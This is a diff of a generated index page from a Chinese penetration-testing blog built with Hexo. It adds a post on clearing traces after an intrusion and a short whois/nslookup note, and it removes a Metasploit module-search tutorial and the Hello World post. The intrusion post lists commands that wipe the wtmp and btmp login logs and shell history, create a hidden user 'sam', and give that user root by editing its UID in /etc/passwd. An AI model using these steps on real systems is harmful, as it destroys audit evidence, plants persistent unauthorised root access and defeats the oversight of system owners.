@@ -142,7 +142,7 @@
                 
                 <section class="switch-part switch-part2">
                     <div class="widget tagcloud" id="js-tagcloud">
-                        <a href="/tags/AIX/" style="font-size: 10px;">AIX</a> <a href="/tags/Attack/" style="font-size: 10px;">Attack</a> <a href="/tags/Google-Hack/" style="font-size: 10px;">Google Hack</a> <a href="/tags/Information-Gathering/" style="font-size: 10px;">Information Gathering</a> <a href="/tags/Learning-Scrapy/" style="font-size: 10px;">Learning Scrapy</a> <a href="/tags/Linux/" style="font-size: 12.5px;">Linux</a> <a href="/tags/Metasploit/" style="font-size: 12.5px;">Metasploit</a> <a href="/tags/Penetration-Testing/" style="font-size: 15px;">Penetration Testing</a> <a href="/tags/Python/" style="font-size: 15px;">Python</a> <a href="/tags/Understanding-Network-Hacks/" style="font-size: 20px;">Understanding Network Hacks</a> <a href="/tags/Web/" style="font-size: 10px;">Web</a> <a href="/tags/iOS学习/" style="font-size: 10px;">iOS学习</a> <a href="/tags/乱七八糟/" style="font-size: 10px;">乱七八糟</a> <a href="/tags/渗透测试/" style="font-size: 17.5px;">渗透测试</a>
+                        <a href="/tags/AIX/" style="font-size: 12.5px;">AIX</a> <a href="/tags/Attack/" style="font-size: 10px;">Attack</a> <a href="/tags/Google-Hack/" style="font-size: 10px;">Google Hack</a> <a href="/tags/Information-Gathering/" style="font-size: 10px;">Information Gathering</a> <a href="/tags/Learning-Scrapy/" style="font-size: 10px;">Learning Scrapy</a> <a href="/tags/Linux/" style="font-size: 12.5px;">Linux</a> <a href="/tags/Metasploit/" style="font-size: 12.5px;">Metasploit</a> <a href="/tags/Penetration-Testing/" style="font-size: 15px;">Penetration Testing</a> <a href="/tags/Python/" style="font-size: 15px;">Python</a> <a href="/tags/Socket/" style="font-size: 10px;">Socket</a> <a href="/tags/Understanding-Network-Hacks/" style="font-size: 20px;">Understanding Network Hacks</a> <a href="/tags/Web/" style="font-size: 10px;">Web</a> <a href="/tags/iOS学习/" style="font-size: 10px;">iOS学习</a> <a href="/tags/乱七八糟/" style="font-size: 10px;">乱七八糟</a> <a href="/tags/渗透测试/" style="font-size: 17.5px;">渗透测试</a>
                     </div>
                 </section>
                 
@@ -219,6 +219,127 @@
     </div>
 </nav>
       <div class="body-wrap">
+  
+    <article id="post-入侵删除记录" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2016/05/30/入侵删除记录/" class="article-date">
+      <time datetime="2016-05-30T15:53:52.000Z" itemprop="datePublished">2016-05-30</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/05/30/入侵删除记录/">入侵删除记录</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">删除成功登录记录:</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/<span class="built_in">log</span>/wtmp</span><br><span class="line">last</span><br><span class="line"></span><br><span class="line">删除失败登录记录:</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/<span class="built_in">log</span>/btmp</span><br><span class="line">lastb</span><br><span class="line"></span><br><span class="line">删除操作记录</span><br><span class="line">clear <span class="built_in">history</span></span><br><span class="line"><span class="built_in">history</span> -c</span><br><span class="line"></span><br><span class="line">留用户</span><br><span class="line">useradd <span class="operator">-d</span> /usr/sam -m sam</span><br><span class="line">passwd sam 加入密码</span><br><span class="line"></span><br><span class="line">将sam拥有和root一样的权限</span><br><span class="line">打开/etc/passwd 将<span class="number">500</span>：<span class="number">500</span>前<span class="number">500</span>改成<span class="number">0</span> 保存退出</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Attack/">Attack</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-information-gathering" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2016/04/26/information-gathering/" class="article-date">
+      <time datetime="2016-04-26T14:02:19.000Z" itemprop="datePublished">2016-04-26</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/04/26/information-gathering/">information gathering</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h3 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h3><h2 id="whois"><a href="#whois" class="headerlink" title="whois"></a>whois</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.Install this tool on Kali Linux</span><br></pre></td></tr></table></figure>
+<p><img src="http://7xs1w6.com1.z0.glb.clouddn.com/whois_install.png" alt=""><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span>.How to use it?</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://7xs1w6.com1.z0.glb.clouddn.com/useit.png" alt=""></p>
+<h2 id="nslookup"><a href="#nslookup" class="headerlink" title="nslookup"></a>nslookup</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.How to use nslookup?</span><br></pre></td></tr></table></figure>
+<p><img src="http://7xs1w6.com1.z0.glb.clouddn.com/nslookup.png" alt=""></p>
+<h2 id="host"><a href="#host" class="headerlink" title="host"></a>host</h2><p>host -t ns zoneedit.com</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/渗透测试/">渗透测试</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
   
     <article id="post-Windows克隆Administrator账户实验" class="article article-type-post" itemscope itemprop="blogPost">
   
@@ -726,132 +847,6 @@ int main(int argc, const char * argv[]) {
         <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Information-Gathering/">Information Gathering</a></li></ul>
     </div>
 
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-Metasploit01" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2016/03/17/Metasploit01/" class="article-date">
-      <time datetime="2016-03-17T11:54:15.000Z" itemprop="datePublished">2016-03-17</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/03/17/Metasploit01/">Metasploit01</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <h3 id="before-we-use-Metasploit"><a href="#before-we-use-Metasploit" class="headerlink" title="before we use Metasploit"></a>before we use Metasploit</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Use the following <span class="built_in">command</span> to open the postgresql service</span><br><span class="line"><span class="string">'service postgresql start'</span></span><br></pre></td></tr></table></figure>
-<h3 id="Open-the-Metasploit-software"><a href="#Open-the-Metasploit-software" class="headerlink" title="Open the Metasploit software"></a>Open the Metasploit software</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Use the <span class="string">'msfconsole'</span> to open the software</span><br><span class="line">The location of Metasploit is</span><br><span class="line"> /usr/share/metasploit-framework/msfconsole</span><br></pre></td></tr></table></figure>
-<h3 id="Help-function-in-Metasploit"><a href="#Help-function-in-Metasploit" class="headerlink" title="Help function in Metasploit"></a>Help function in Metasploit</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'msfconsole -h'</span></span><br></pre></td></tr></table></figure>
-<h3 id="Find-system-hole-by-name"><a href="#Find-system-hole-by-name" class="headerlink" title="Find system hole by name"></a>Find system hole by name</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'search name:mysql'</span></span><br><span class="line">msf &gt; search name:mysql</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   Name                                               Disclosure Date  Rank       Description</span><br><span class="line">   ----                                               ---------------  ----       -----------</span><br><span class="line">   auxiliary/admin/mysql/mysql_enum                                    normal     MySQL Enumeration Module</span><br><span class="line">   auxiliary/admin/mysql/mysql_sql                                     normal     MySQL SQL Generic Query</span><br><span class="line">   auxiliary/analyze/jtr_mysql_fast                                    normal     John the Ripper MySQL Password Cracker (Fast Mode)</span><br><span class="line">   auxiliary/scanner/mysql/mysql_authbypass_hashdump  <span class="number">2012</span>-<span class="number">06</span>-<span class="number">09</span>       normal     MySQL Authentication Bypass Password Dump</span><br><span class="line">   auxiliary/scanner/mysql/mysql_file_enum                             normal     MYSQL File/Directory Enumerator</span><br><span class="line">   auxiliary/scanner/mysql/mysql_hashdump                              normal     MYSQL Password Hashdump</span><br><span class="line">   auxiliary/scanner/mysql/mysql_login                                 normal     MySQL Login Utility</span><br><span class="line">   auxiliary/scanner/mysql/mysql_schemadump                            normal     MYSQL Schema Dump</span><br><span class="line">   auxiliary/scanner/mysql/mysql_version                               normal     MySQL Server Version Enumeration</span><br><span class="line">   auxiliary/server/capture/mysql                                      normal     Authentication Capture: MySQL</span><br><span class="line">   exploit/linux/mysql/mysql_yassl_getname            <span class="number">2010</span>-<span class="number">01</span>-<span class="number">25</span>       good       MySQL yaSSL CertDecoder::GetName Buffer Overflow</span><br><span class="line">   exploit/linux/mysql/mysql_yassl_hello              <span class="number">2008</span>-<span class="number">01</span>-<span class="number">04</span>       good       MySQL yaSSL SSL Hello Message Buffer Overflow</span><br><span class="line">   exploit/windows/mysql/mysql_mof                    <span class="number">2012</span>-<span class="number">12</span>-<span class="number">01</span>       excellent  Oracle MySQL <span class="keyword">for</span> Microsoft Windows MOF Execution</span><br><span class="line">   exploit/windows/mysql/mysql_payload                <span class="number">2009</span>-<span class="number">01</span>-<span class="number">16</span>       excellent  Oracle MySQL <span class="keyword">for</span> Microsoft Windows Payload Execution</span><br><span class="line">   exploit/windows/mysql/mysql_start_up               <span class="number">2012</span>-<span class="number">12</span>-<span class="number">01</span>       excellent  Oracle MySQL <span class="keyword">for</span> Microsoft Windows FILE Privilege Abuse</span><br><span class="line">   exploit/windows/mysql/mysql_yassl_hello            <span class="number">2008</span>-<span class="number">01</span>-<span class="number">04</span>       average    MySQL yaSSL SSL Hello Message Buffer Overflow</span><br><span class="line">   exploit/windows/mysql/scrutinizer_upload_<span class="built_in">exec</span>      <span class="number">2012</span>-<span class="number">07</span>-<span class="number">27</span>       excellent  Plixer Scrutinizer NetFlow and sFlow Analyzer <span class="number">9</span> Default MySQL Credential</span><br></pre></td></tr></table></figure>
-<h3 id="Find-system-hole-by-platform"><a href="#Find-system-hole-by-platform" class="headerlink" title="Find system hole by platform"></a>Find system hole by platform</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'search platform：mysql'</span></span><br><span class="line">msf &gt;search platform:mysql</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   Name                                          Disclosure Date  Rank       Description</span><br><span class="line">   ----                                          ---------------  ----       -----------</span><br><span class="line">   exploit/linux/mysql/mysql_yassl_getname       <span class="number">2010</span>-<span class="number">01</span>-<span class="number">25</span>       good       MySQL yaSSL CertDecoder::GetName Buffer Overflow</span><br><span class="line">   exploit/linux/mysql/mysql_yassl_hello         <span class="number">2008</span>-<span class="number">01</span>-<span class="number">04</span>       good       MySQL yaSSL SSL Hello Message Buffer Overflow</span><br><span class="line">   exploit/multi/http/manage_engine_dc_pmp_sqli  <span class="number">2014</span>-<span class="number">06</span>-<span class="number">08</span>       excellent  ManageEngine Desktop Central / Password Manager LinkViewFetchServlet.dat SQL Injection</span><br><span class="line">   exploit/windows/mysql/mysql_mof               <span class="number">2012</span>-<span class="number">12</span>-<span class="number">01</span>       excellent  Oracle MySQL <span class="keyword">for</span> Microsoft Windows MOF Execution</span><br><span class="line">   exploit/windows/mysql/mysql_start_up          <span class="number">2012</span>-<span class="number">12</span>-<span class="number">01</span>       excellent  Oracle MySQL <span class="keyword">for</span> Microsoft Windows FILE Privilege Abuse</span><br><span class="line">   exploit/windows/mysql/mysql_yassl_hello       <span class="number">2008</span>-<span class="number">01</span>-<span class="number">04</span>       average    MySQL yaSSL SSL Hello Message Buffer Overflow</span><br></pre></td></tr></table></figure>
-<h3 id="Search-by-type"><a href="#Search-by-type" class="headerlink" title="Search by type"></a>Search by type</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'search type：post'</span></span><br></pre></td></tr></table></figure>
-<h3 id="Search-by-author"><a href="#Search-by-author" class="headerlink" title="Search by author"></a>Search by author</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'search author：dookie'</span></span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Metasploit/">Metasploit</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-hello-world" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2016/03/16/hello-world/" class="article-date">
-      <time datetime="2016-03-16T15:15:07.000Z" itemprop="datePublished">2016-03-16</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/03/16/hello-world/">Hello World</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <p>Welcome to <a href="http://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="http://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="http://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-<p>More info: <a href="http://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="http://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="http://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="http://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
       
       <div class="clearfix"></div>
     </div>
